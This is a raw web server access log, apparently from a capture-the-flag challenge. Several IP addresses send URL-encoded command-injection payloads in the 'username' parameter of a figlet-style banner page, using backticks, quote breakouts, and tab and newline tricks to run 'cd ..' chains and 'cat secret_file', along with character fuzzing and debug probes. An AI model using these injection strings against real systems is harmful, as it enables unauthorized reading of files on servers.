113.185.73.118 - - [28/Aug/2022:07:31:27 +0000] "GET / HTTP/1.1" 200 1177 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
14.161.31.188 - - [28/Aug/2022:07:31:28 +0000] "GET /index.php?username=%2560pwd%2560&type=figlet HTTP/1.1" 200 1288 "http://128.199.190.141:5551/index.php?username=%2560cd%2509..%250acd%2509..%250acd%2509..%250acat%2509secret_file%2560&type=figlet" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:103.0) Gecko/20100101 Firefox/103.0"
58.187.43.105 - - [28/Aug/2022:07:31:28 +0000] "GET /index.php?username='cd%09..%0Acd%09..%0Acd%09..%0Acd%09root%0Acat%09secret_file%0A&type=eyes HTTP/1.1" 200 1032 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36"
58.187.43.105 - - [28/Aug/2022:07:31:29 +0000] "GET /index.php?username=%27cd%2509..%250Acd%2509..%250Acd%2509..%250Acd%2509root%250Anl%2509secret_file%250A&type=figlet HTTP/1.1" 200 1147 "http://128.199.190.141:5551/index.php?username=%27cd%2509..%250Acd%2509..%250Acd%2509..%250Acd%2509root%250Acat%2509secret_file%250A&type=figlet" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
58.187.43.105 - - [28/Aug/2022:07:31:32 +0000] "GET /index.php?username='cd%09..%0Acd%09..%0Acd%09..%0Acd%09root%0Acat%09secret_file%0A&type=eyes HTTP/1.1" 200 1032 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36"
58.187.43.105 - - [28/Aug/2022:07:31:34 +0000] "GET /index.php?username=%27cd%2509..%250Acd%2509..%250Acd%2509..%250Acd%2509root%250Acat%2509secret_file%250A&type=figlet HTTP/1.1" 200 1142 "http://128.199.190.141:5551/index.php?username=%27cd%2509..%250Acd%2509..%250Acd%2509..%250Acd%2509root%250Anl%2509secret_file%250A&type=figlet" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
58.187.43.105 - - [28/Aug/2022:07:31:36 +0000] "GET / HTTP/1.1" 200 1167 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36 Edg/104.0.1293.63"
58.187.43.105 - - [28/Aug/2022:07:31:37 +0000] "GET /index.php?username=%21%40%23%24%25%26%5E*%28%29_%2B-%3D%7B%7D%5B%5D%7C%5C%3A%27%3B%22%2C.%2F%3C%3E%3F&type=random HTTP/1.1" 200 1227 "http://128.199.190.141:5551/index.php?username=%2F%24&type=figlet" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
58.187.43.105 - - [28/Aug/2022:07:31:38 +0000] "GET /index.php?username=%2560cd%2509..%250Acd%2509..%250Acd%2509..%250Acd%2509..%250Acat%2509secret_file%2560 HTTP/1.1" 200 2844 "-" "curl/7.83.1"
58.187.43.105 - - [28/Aug/2022:07:31:44 +0000] "GET /index.php?username=%2560cd%2509..%250Acd%2509..%250Acd%2509..%250Acd%2509..%250Acat%2509secret_file%2560 HTTP/1.1" 200 3307 "-" "curl/7.83.1"
14.161.31.188 - - [28/Aug/2022:07:31:53 +0000] "GET /index.php?username=%27cd%2509..%250Acd%2509..%250Acd%2509..%250Acd%2509root%250Acat%2509secret_file%250A&type=toilet HTTP/1.1" 200 1139 "http://128.199.190.141:5551/index.php?username=%27cd%2509..%250Acd%2509..%250Acd%2509..%250Acd%2509root%250Acat%2509secret_file%250A&type=figlet" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36 Edg/104.0.1293.70"
14.161.31.188 - - [28/Aug/2022:07:31:57 +0000] "GET /index.php?username=%2560cd%2509..%250Acd%2509..%250Acd%2509..%250Acd%2509..%250Acat%2509secret_file%2560&type=figlet HTTP/1.1" 200 1905 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
14.161.31.188 - - [28/Aug/2022:07:31:58 +0000] "GET / HTTP/1.1" 200 1221 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
14.161.31.188 - - [28/Aug/2022:07:32:01 +0000] "GET /index.php?username=%27cd%09..%0Acd%09..%0Acd%09..%0Acat%09*%0A&type=figlet HTTP/1.1" 200 1024 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36"
14.161.31.188 - - [28/Aug/2022:07:32:01 +0000] "GET /index.php?username=%27cd%2509..%250Acd%2509..%250Acd%2509..%250Acd%2509root%250Acat%2509secret_file%250A&type=figlet HTTP/1.1" 200 1142 "http://128.199.190.141:5551/index.php?username=%27cd%2509..%250Acd%2509..%250Acd%2509..%250Acd%2509root%250Acat%2509secret_file%250A&type=toilet" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36 Edg/104.0.1293.70"
14.161.31.188 - - [28/Aug/2022:07:32:07 +0000] "GET /index.php?debug HTTP/1.1" 200 2601 "http://128.199.190.141:5551/index.php?username=%2560pwd%2560&type=figlet" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:103.0) Gecko/20100101 Firefox/103.0"
14.161.31.188 - - [28/Aug/2022:07:32:10 +0000] "GET /index.php HTTP/1.1" 200 1177 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36"
14.161.31.188 - - [28/Aug/2022:07:32:11 +0000] "GET /index.php?username=a&type=figlet HTTP/1.1" 200 1173 "http://128.199.190.141:5551/index.php?username=%27%3Bcat+%2Fsecret_file+%23%27%3Bls+%2F+%23&type=figlet" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36 Edg/104.0.1293.63"
14.161.31.188 - - [28/Aug/2022:07:32:18 +0000] "GET /index.php?username=%27cd%09..%0Acd%09..%0Acd%09..%0Acat%09secret_file%0A&type=figlet HTTP/1.1" 200 1101 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36"
171.253.1.35 - - [28/Aug/2022:07:32:18 +0000] "GET /index.php?username=%601%60&type=random&debug HTTP/1.1" 200 2601 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0"
171.253.1.35 - - [28/Aug/2022:07:32:21 +0000] "GET /index.php?username=%2560cd%2509..%250Acd%2509..%250Acd%2509..%250Acd%2509..%250Als%2560&type=random HTTP/1.1" 200 1180 "http://128.199.190.141:5551/index.php?username=%25&type=random" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0"
14.161.31.188 - - [28/Aug/2022:07:32:25 +0000] "-" 408 0 "-" "-"
58.187.43.105 - - [28/Aug/2022:07:32:29 +0000] "-" 408 0 "-" "-"
58.187.43.105 - - [28/Aug/2022:07:32:29 +0000] "GET /index.php?username=&type=figlet HTTP/1.1" 200 1158 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:103.0) Gecko/20100101 Firefox/103.0"
171.253.1.35 - - [28/Aug/2022:07:32:33 +0000] "GET /index.php?username=%2560cd%2509..%250Acd%2509..%250Acd%2509..%250Acd%2509..%250Als%2560&type=toilet HTTP/1.1" 200 1310 "http://128.199.190.141:5551/index.php?username=%2560cd%2509..%250Acd%2509..%250Acd%2509..%250Acd%2509..%250Als%2560&type=random" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0"
58.187.43.105 - - [28/Aug/2022:07:32:36 +0000] "GET /index.php?debug HTTP/1.1" 200 2601 "http://128.199.190.141:5551/index.php?username=%2560pwd%2560&type=figlet" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:103.0) Gecko/20100101 Firefox/103.0"
58.187.43.105 - - [28/Aug/2022:07:32:37 +0000] "GET /index.php?debug HTTP/1.1" 200 2638 "http://128.199.190.141:5551/index.php?username=&type=figlet" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:103.0) Gecko/20100101 Firefox/103.0"
14.161.31.188 - - [28/Aug/2022:07:32:41 +0000] "GET /index.php?username=%27&type=eyes HTTP/1.1" 200 1040 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36 Edg/104.0.1293.70"
58.187.43.105 - - [28/Aug/2022:07:32:43 +0000] "GET /index.php?username=%27cd%2509..%250Acd%2509..%250Acd%2509..%250Acd%2509root%250Acat%2509secret_file%250A&type=random HTTP/1.1" 200 1292 "http://128.199.190.141:5551/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
14.161.31.188 - - [28/Aug/2022:07:32:44 +0000] "GET /index.php?username=%27cd%2509..%250Acd%2509..%250Acd%2509..%250Acd%2509root%250Acat%2509secret_file%250A&type=random HTTP/1.1" 200 1207 "http://128.199.190.141:5551/index.php?username=%27&type=eyes" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36 Edg/104.0.1293.70"
171.253.1.35 - - [28/Aug/2022:07:32:47 +0000] "GET /index.php?username=%601%60&type=random&debug HTTP/1.1" 200 2601 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0"
58.187.43.105 - - [28/Aug/2022:07:32:48 +0000] "GET /index.php?debug HTTP/1.1" 200 2637 "http://128.199.190.141:5551/index.php?username=%27cd%2509..%250Acd%2509..%250Acd%2509..%250Acd%2509root%250Acat%2509secret_file%250A&type=random" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
14.161.31.188 - - [28/Aug/2022:07:32:48 +0000] "-" 408 0 "-" "-"
14.161.31.188 - - [28/Aug/2022:07:32:53 +0000] "-" 408 0 "-" "-"
14.161.31.188 - - [28/Aug/2022:07:32:54 +0000] "GET /index.php?username=%27cd%2509..%250Acd%2509..%250Acd%2509..%250Acd%2509root%250Acat%2509secret_file%250A&type=figlet HTTP/1.1" 200 1142 "http://128.199.190.141:5551/index.php?username=%27cd%2509..%250Acd%2509..%250Acd%2509..%250Acd%2509root%250Acat%2509secret_file%250A&type=figlet" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36 Edg/104.0.1293.70"
14.161.31.188 - - [28/Aug/2022:07:32:59 +0000] "GET /index.php?username=cd%2509..%250Acd%2509..%250Acd%2509..%250Acd%2509root%250Acat%2509secret_file%250A&type=random HTTP/1.1" 200 1196 "http://128.199.190.141:5551/index.php?username=%27cd%2509..%250Acd%2509..%250Acd%2509..%250Acd%2509root%250Acat%2509secret_file%250A&type=random" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
14.161.31.188 - - [28/Aug/2022:07:33:02 +0000] "-" 408 0 "-" "-"
14.161.31.188 - - [28/Aug/2022:07:33:06 +0000] "GET /index.php?username=%60cd%2509..%250Acd%2509..%250Acd%2509..%250Acd%2509root%250Acat%2509secret_file%250A&type=figlet HTTP/1.1" 200 1401 "http://128.199.190.141:5551/index.php?username=cd%2509..%250Acd%2509..%250Acd%2509..%250Acd%2509root%250Acat%2509secret_file%250A&type=random" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
171.253.1.35 - - [28/Aug/2022:07:33:17 +0000] "GET /index.php?username=%2560cd%2509..%250Acd%2509..%250Acd%2509..%250Acd%2509..%250Als%2509%2560&type=figlet HTTP/1.1" 200 1788 "http://128.199.190.141:5551/index.php?username=%2560cd%2509..%250Acd%2509..%250Acd%2509..%250Acd%2509..%250Als%2560&type=toilet" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0"
58.187.43.105 - - [28/Aug/2022:07:33:19 +0000] "GET /index.php?username=%21%40%23%24%25%26%5E*%28%29_%2B-%3D%7B%7D%5B%5D%7C%5C%3A%27%3B%22%2C.%2F%3C%3E%3F&type=random HTTP/1.1" 200 1204 "http://128.199.190.141:5551/index.php?username=%2F%24&type=figlet" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
14.161.31.188 - - [28/Aug/2022:07:33:23 +0000] "GET /index.php?username=%60cd%2509..%250Acd%2509..%250Acd%2509..%250Acd%2509root%250Acat%2509secret_file%250A&type=figlet HTTP/1.1" 200 1401 "http://128.199.190.141:5551/index.php?username=%60cd%2509..%250Acd%2509..%250Acd%2509..%250Acd%2509root%250Acat%2509secret_file%250A&type=figlet" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
58.187.43.105 - - [28/Aug/2022:07:33:24 +0000] "GET /index.php?username=%27cd%2509..%250Acd%2509..%250Acd%2509..%250Acd%2509root%250Acat%2509secret_file%250A&type=figlet HTTP/1.1" 200 1142 "http://128.199.190.141:5551/index.php?username=%27cd%2509..%250Acd%2509..%250Acd%2509..%250Acd%2509root%250Acat%2509secret_file%250A&type=random" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36 Edg/104.0.1293.70"
58.187.43.105 - - [28/Aug/2022:07:33:32 +0000] "GET /index.php?username=%2560cd%2509..%250Acd%2509..%250Acd%2509..%250Acd%2509..%250Acat%2509secret_file%2560&type=figlet HTTP/1.1" 200 1905 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
58.187.43.105 - - [28/Aug/2022:07:33:42 +0000] "GET /index.php?debug HTTP/1.1" 200 2638 "http://128.199.190.141:5551/index.php?username=%27cd%09..%0Acd%09..%0Acd%09..%0Acat%09secret_file%0A&type=figlet" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
58.187.43.105 - - [28/Aug/2022:07:33:45 +0000] "-" 408 0 "-" "-"
14.161.31.188 - - [28/Aug/2022:07:33:48 +0000] "GET /index.php?username=%24%24%24%24%24%24%24%24&type=random HTTP/1.1" 200 1215 "http://128.199.190.141:5551/index.php?username=%5C%5C%5C%5C%5C%5C%5C%5C%5C%5C%5C%5C%5C%5C&type=random" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0"
14.161.31.188 - - [28/Aug/2022:07:33:48 +0000] "GET /favicon.ico HTTP/1.1" 404 495 "http://128.199.190.141:5551/index.php?username=%24%24%24%24%24%24%24%24&type=random" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0"
58.187.43.105 - - [28/Aug/2022:07:33:49 +0000] "GET /index.php?username=%2560cd%2509..%250Acd%2509..%250Acd%2509..%250Acd%2509..%250Acat%2509secret_file%2560 HTTP/1.1" 200 3024 "-" "curl/7.83.1"
14.161.31.188 - - [28/Aug/2022:07:33:51 +0000] "GET /index.php?debug HTTP/1.1" 200 2638 "http://128.199.190.141:5551/index.php?username=%24%24%24%24%24%24%24%24&type=random" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0"
14.161.31.188 - - [28/Aug/2022:07:34:05 +0000] "GET /index.php?username=%2F%5B%5C%60%5C%7E%5C%21%5C%40%5C%23%5C%24%5C%26%5C*%5C%2F%5C-%5C%3D%5C%22%5C%28%5C%29%5C%7B%5C%7D%5C%5B%5C%5D%5C%3B%5C%3A%5C%7C%5C%3E%5C%3C%5C%3F%5D%2F&type=random HTTP/1.1" 200 1307 "http://128.199.190.141:5551/index.php?username=%24%24%24%24%24%24%24%24&type=random" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0"
58.187.43.105 - - [28/Aug/2022:07:34:15 +0000] "-" 408 0 "-" "-"
58.187.43.105 - - [28/Aug/2022:07:34:15 +0000] "GET /index.php?debug HTTP/1.1" 200 2638 "http://128.199.190.141:5551/index.php?username=%27cd%09..%0Acd%09..%0Acd%09..%0Acat%09secret_file%0A&type=figlet" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
14.161.31.188 - - [28/Aug/2022:07:34:15 +0000] "-" 408 0 "-" "-"
58.187.43.105 - - [28/Aug/2022:07:34:23 +0000] "-" 408 0 "-" "-"
58.187.43.105 - - [28/Aug/2022:07:34:40 +0000] "GET /index.php?username=%21%40%23%24%25%5E%26*%28%29_%2B%7B%7D%7C%3A%22%3C%3E%3F-%3D%5B%5D%5C%3B%27%2C.%2F&type=figlet HTTP/1.1" 200 1055 "http://128.199.190.141:5551/index.php?username=%27cd%09..%0Acd%09..%0Acd%09..%0Acat%09secret_file%0A&type=figlet" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
58.187.43.105 - - [28/Aug/2022:07:35:23 +0000] "GET /index.php?username=%40%23%24%25%5E%26*%28%29_%2B%7B%7D%7C%3A%22%3C%3E%3F-%3D%5B%5D%5C%3B%27%2C.%2F&type=figlet HTTP/1.1" 200 1055 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
14.161.31.188 - - [28/Aug/2022:07:35:30 +0000] "GET /index.php?username=%24%25%5E%26*%28%29_%2B%7B%7D%7C%3A%22%3C%3E%3F-%3D%5B%5D%5C%3B%27%2C.%2F&type=figlet HTTP/1.1" 200 1055 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
58.187.43.105 - - [28/Aug/2022:07:35:36 +0000] "GET /index.php?username=%24%25%26*%28%29_%2B%7B%7D%7C%3A%22%3C%3E%3F-%3D%5B%5D%5C%3B%27%2C.%2F&type=figlet HTTP/1.1" 200 1055 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
14.161.31.188 - - [28/Aug/2022:07:35:45 +0000] "GET /index.php?username=%24%5E%26*%28%29_%2B%7B%7D%7C%3A%22%3C%3E%3F-%3D%5B%5D%5C%3B%27%2C.%2F&type=figlet HTTP/1.1" 200 1054 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
14.161.31.188 - - [28/Aug/2022:07:35:50 +0000] "GET /index.php?username=%5E%26*%28%29_%2B%7B%7D%7C%3A%22%3C%3E%3F-%3D%5B%5D%5C%3B%27%2C.%2F&type=figlet HTTP/1.1" 200 1053 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
58.187.43.105 - - [28/Aug/2022:07:35:57 +0000] "GET /index.php?username=%25%5E%26*%28%29_%2B%7B%7D%7C%3A%22%3C%3E%3F-%3D%5B%5D%5C%3B%27%2C.%2F&type=figlet HTTP/1.1" 200 1055 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
58.187.43.105 - - [28/Aug/2022:07:36:28 +0000] "GET /index.php?username='cd%09..%0Acd%09..%0Acd%09..%0Acd%09root%0Acat%09secret_file%0A&type=eyes HTTP/1.1" 200 1032 "http://128.199.190.141:5551/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
58.187.43.105 - - [28/Aug/2022:07:36:49 +0000] "-" 408 0 "-" "-"
14.161.31.188 - - [28/Aug/2022:07:36:56 +0000] "GET /index.php?username='cd%09..%0Acd%09..%0Acd%09..%0Acd%09root%0Acat%09secret_file%0A&type=eyes HTTP/1.1" 200 1032 "http://128.199.190.141:5551/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
58.187.43.105 - - [28/Aug/2022:07:37:02 +0000] "GET /index.php?username=%27cd%2509..%250Acd%2509..%250Acd%2509..%250Acd%2509root%250Acat%2509secret_file%250A&type=random HTTP/1.1" 200 1232 "http://128.199.190.141:5551/index.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36"
58.187.43.105 - - [28/Aug/2022:07:37:03 +0000] "GET /index.php?username=cd%2509..%250Acd%2509..%250Acd%2509..%250Acd%2509root%250Acat%2509secret_file%250A&type=figlet HTTP/1.1" 200 1401 "http://128.199.190.141:5551/index.php?username=%2560cd%2509..%250Acd%2509..%250Acd%2509..%250Acd%2509..%250Acat%2509secret_file%2560&type=figlet" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
58.187.43.105 - - [28/Aug/2022:07:37:17 +0000] "GET /index.php?username=%27cd%2509..%250Acd%2509..%250Acd%2509..%250Acd%2509root%250Acat%2509secret_file%250A&type=eyes HTTP/1.1" 200 1069 "http://128.199.190.141:5551/index.php?username=cd%2509..%250Acd%2509..%250Acd%2509..%250Acd%2509root%250Acat%2509secret_file%250A&type=figlet" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
14.161.31.188 - - [28/Aug/2022:07:37:19 +0000] "GET /index.php?username='cd%09..%0Acd%09..%0Acd%09..%0Acd%09root%0Acat%09secret_file%0A&type=eyes HTTP/1.1" 200 1032 "http://128.199.190.141:5551/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
58.187.43.105 - - [28/Aug/2022:07:37:26 +0000] "GET /index.php?username=%27%27cd%2509..%250Acd%2509..%250Acd%2509..%250Acd%2509root%250Acat%2509secret_file%250A&type=random HTTP/1.1" 200 1197 "http://128.199.190.141:5551/index.php?username=%27cd%2509..%250Acd%2509..%250Acd%2509..%250Acd%2509root%250Acat%2509secret_file%250A&type=eyes" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
58.187.43.105 - - [28/Aug/2022:07:37:27 +0000] "GET /index.php?username=%27cd%2509..%250Acd%2509..%250Acd%2509..%250Acd%2509root%250Acat%2509secret_file%250A&type=eyes HTTP/1.1" 200 1032 "http://128.199.190.141:5551/index.php?username=$2550&type=eyes" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
58.187.43.105 - - [28/Aug/2022:07:37:33 +0000] "GET /index.php?username=%27cd%09..%0Acd%09..%0Acd%09..%0Acd%09root%0Acat%09secret_file%0A HTTP/1.1" 200 1227 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36"
58.187.43.105 - - [28/Aug/2022:07:37:35 +0000] "GET /index.php?username=%27%27cd%2509..%250Acd%2509..%250Acd%2509..%250Acd%2509root%250Acat%2509secret_file%250A&type=eyes HTTP/1.1" 200 1075 "http://128.199.190.141:5551/index.php?username=%27%27cd%2509..%250Acd%2509..%250Acd%2509..%250Acd%2509root%250Acat%2509secret_file%250A&type=random" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
14.161.31.188 - - [28/Aug/2022:07:37:35 +0000] "GET /index.php?username=%27cd%2509..%250Acd%2509..%250Acd%2509..%250Acd%2509root%250Acat%2509secret_file%250A&type=eyes HTTP/1.1" 200 1032 "http://128.199.190.141:5551/index.php?username=%27cd%2509..%250Acd%2509..%250Acd%2509..%250Acd%2509root%250Acat%2509secret_file%250A&type=eyes" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
58.187.43.105 - - [28/Aug/2022:07:37:40 +0000] "GET /index.php?username='cd%09..%0Acd%09..%0Acd%09..%0Acd%09root%0Acat%09secret_file%0A&type=eyes HTTP/1.1" 200 1032 "http://128.199.190.141:5551/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
14.161.31.188 - - [28/Aug/2022:07:37:49 +0000] "GET /index.php?username='%0Acd%09..%0Acd%09..%0Acd%09..%0Acd%09root%0Acat%09secret_file%0A&type=eyes HTTP/1.1" 200 1101 "http://128.199.190.141:5551/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
58.187.43.105 - - [28/Aug/2022:07:37:53 +0000] "GET /index.php?username=%27cd%2509..%250Acd%2509..%250Acd%2509..%250Acd%2509root%250Acat%2509secret_file%250A&type=eyes HTTP/1.1" 200 1069 "http://128.199.190.141:5551/index.php?username=%27%27cd%2509..%250Acd%2509..%250Acd%2509..%250Acd%2509root%250Acat%2509secret_file%250A&type=eyes" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
14.161.31.188 - - [28/Aug/2022:07:38:03 +0000] "GET /index.php?username=%27cd%2509..%250Acd%2509..%250Acd%2509..%250Acd%2509root%250Acat%2509secret_file%250A&type=toilet HTTP/1.1" 200 1139 "http://128.199.190.141:5551/index.php?username=%27cd%2509..%250Acd%2509..%250Acd%2509..%250Acd%2509root%250Acat%2509secret_file%250A&type=eyes" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
58.187.43.105 - - [28/Aug/2022:07:38:09 +0000] "GET /index.php?username=%27cd%09..%0Acd%09..%0Acd%09..%0Acd%09root%0Acat%09secret_file%0A&type=figlet HTTP/1.1" 200 1142 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
14.161.31.188 - - [28/Aug/2022:07:38:10 +0000] "GET /index.php?username='%0Acd%09..%0Acd%09..%0Acd%09..%0Acd%09root%0Als%0A&type=eyes HTTP/1.1" 200 1086 "http://128.199.190.141:5551/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
58.187.43.105 - - [28/Aug/2022:07:38:24 +0000] "GET /index.php?username='%0Acd%09..%0Acd%09..%0Acd%09..%0Acd%09root%0Acat%09secret_file%0A&type=eyes HTTP/1.1" 200 1101 "http://128.199.190.141:5551/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
58.187.43.105 - - [28/Aug/2022:07:38:38 +0000] "GET /index.php?username=%27cd%2509..%250Acd%2509..%250Acd%2509..%250Acd%2509root%250Acat%2509secret_file%250A&type=random HTTP/1.1" 200 1226 "http://128.199.190.141:5551/index.php?username=%2F%5B%5C%60%5C%7E%5C%21%5C%40%5C%23%5C%24%5C%26%5C*%5C%2F%5C-%5C%3D%5C%22%5C%28%5C%29%5C%7B%5C%7D%5C%5B%5C%5D%5C%3B%5C%3A%5C%7C%5C%3E%5C%3C%5C%3F%5D%2F&type=random" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0"
